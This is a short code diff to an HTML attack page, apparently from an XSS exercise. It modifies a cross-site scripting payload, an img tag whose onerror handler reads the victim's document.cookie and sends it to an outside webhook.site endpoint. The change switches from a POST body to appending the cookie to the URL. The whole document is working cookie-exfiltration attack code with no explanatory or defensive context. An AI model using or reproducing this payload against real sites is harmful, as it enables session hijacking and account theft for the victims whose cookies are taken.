@@ -7,17 +7,12 @@
         ></iframe>
         <script>
             const WEBHOOK =
-                "https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9";
+                "https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9?c=";
             const payload = `<img src=x onerror="
               (async function() {
                 var WEBHOOK = '${WEBHOOK}';
                 
-                await fetch(WEBHOOK, {
-                  method: 'POST',
-                  mode: 'no-cors',
-                  keepalive: true,
-                  body: JSON.stringify(document.cookie)
-                });
+                await fetch(WEBHOOK+document.cookie);
               })();
             ">`;
 
